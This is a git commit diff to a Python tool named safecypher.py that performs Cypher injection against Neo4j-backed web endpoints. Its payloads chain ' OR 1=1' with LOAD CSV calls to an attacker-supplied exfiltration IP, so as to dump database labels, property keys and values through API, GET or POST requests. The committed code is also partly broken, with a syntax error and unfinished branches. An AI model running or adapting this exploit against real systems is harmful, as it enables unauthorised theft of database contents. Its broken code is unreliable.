944b220f6c46d695bc30f4671a5c6d07592e0adb
yf <73434276+yufongg@users.noreply.github.com>
2024-03-07 06:03:33 +0800

    up

--- safecypher.py
+++ safecypher.py
@@ -20,51 +20,83 @@ cookies = {
 
 
 
-def inject_payload(target, exfil_ip, payload):
-    types = ["asdf'", "-1"]
-    actual_payload = types[0] + payload
-    url = f"{target + urllib.parse.quote(actual_payload, safe='')}"
+def inject_payload(target, exfil_ip, payload, request_type):
+    types = [["NONEXIST'", "Property"], ["-1", "ID"]]
+    for i in range(len(types)):
+        full_payload = types[i][0] + payload 
+        if request_type == "API":
+            url = f"{target + urllib.parse.quote(full_payload, safe='')}"
+            response = requests.get(url, headers=headers, verify=False, proxies=proxies, cookies=cookies)
+            if response.status_code == 200 and "Neo4jError".encode('utf-8') not in response.content:
+                print(f"Injecting in {types[i][1]} ... Check your listener")
+        elif request_type == "GET"
+            print("x")
+        elif request_type == "POST":
+            response = requests.post(url, data=full_payload, headers=headers, verify=False, proxies=proxies, cookies=cookies)
+            if response.status_code == 200 and "Neo4jError".encode('utf-8') not in response.content:
+                print(f"Injecting in {types[i][1]} ... Check your listener")
+        else:
+            print("x")
 
-    response = requests.get(url, headers=headers, verify=False, proxies=proxies, cookies=cookies)
 
-    if response.status_code == 200 and "Neo4jError".encode('utf-8') in response.content:
-        actual_payload = types[1] + payload
-        url = f"{target + urllib.parse.quote(actual_payload, safe='')}"
-
-        response = requests.get(url, headers=headers, verify=False, proxies=proxies, cookies=cookies)
-        print("Injecting in ID ... Check your listener")
-    else:
-        print("Injecting in Properties ... Check your listener")
-
-def dump_labels(target, exfil_ip):
+def dump_labels(target, exfil_ip, request_type):
     payload = f" OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://{exfil_ip}/?label='+label as l RETURN 0 as _0 //"
-    inject_payload(target, exfil_ip, payload)
+    inject_payload(target, exfil_ip, payload, request_type)
 
-def dump_properties(target, exfil_ip, label):
+def dump_properties(target, exfil_ip, label, request_type):
     payload = f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p LOAD CSV FROM 'http://{exfil_ip}/?keys=' + p as l RETURN 0 as _0 //"
-    inject_payload(target, exfil_ip, payload)
+    inject_payload(target, exfil_ip, payload, request_type)
 
-def dump_values(target, exfil_ip, label):
+def dump_values(target, exfil_ip, label, request_type):
     payload = f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p LOAD CSV FROM 'http://{exfil_ip}/?keys=' + p +'='+replace(toString(x[p]),' ','') as l RETURN 0 as _0 //"
-    inject_payload(target, exfil_ip, payload)
+    inject_payload(target, exfil_ip, payload, request_type)
+
 
 def main():
-    parser = argparse.ArgumentParser(description="Inject payloads into Neo4j")
-    parser.add_argument("target", help="Target URL")
-    parser.add_argument("exfil_ip", help="Exfiltration IP")
+    examples = """
+Examples:
 
+API:
+python script.py -u http://ip/api/endpoint -l 127.0.0.1 -t API
+
+http://192.168.17.158:3030/api/neo4j/characters/name/
+
+
+GET:
+python script.py -u http://ip/vulnerable_page -l 127.0.0.1 -t GET -p "vulnerable_parameters"
+
+http://192.168.17.158:3030/api/neo4j/characters?name=Spongebob
+
+
+POST:
+python script.py -u http://ip/vulnerable_page -l 127.0.0.1 -t POST -p "vulnerable_parameters"
+
+http://192.168.17.158:3030/api/neo4j/characters -d "name=Spongebob"
+    """
+    parser = argparse.ArgumentParser(description="Inject payloads into Neo4j", formatter_class=argparse.RawTextHelpFormatter, epilog=examples)
+    parser.add_argument("-u", "--url", required=True, help="Target URL: http://192.168.17.158:3030/api/neo4j/characters")
+    parser.add_argument("-l", "--exfil-ip", required=True, help="Exfiltration IP: 127.0.0.1")
+    parser.add_argument("-t", "--type", required=True, help="API/GET/POST")
+    parser.add_argument("-p", "--parameters", help="Vulnerable parameters")
     args = parser.parse_args()
 
+    target = args.url
+    exfil_ip = args.exfil_ip
+    request_type = args.type
+    parameters = args.parameters
+
+    print(f"Type: {args.type}")
     print("Dumping Labels")
-    dump_labels(args.target, args.exfil_ip)
+    dump_labels(target, exfil_ip, request_type)
 
     label = input("Enter Label: ")
 
     print("Dumping Properties")
-    dump_properties(args.target, args.exfil_ip, label)
+    dump_properties(target, exfil_ip, label, request_type)
 
     print("Dumping Value of Properties")
-    dump_values(args.target, args.exfil_ip, label)
+    dump_values(target, exfil_ip, label, request_type)
 
-if __name__ == '__main__':
+
+if __name__ == "__main__":
     main()
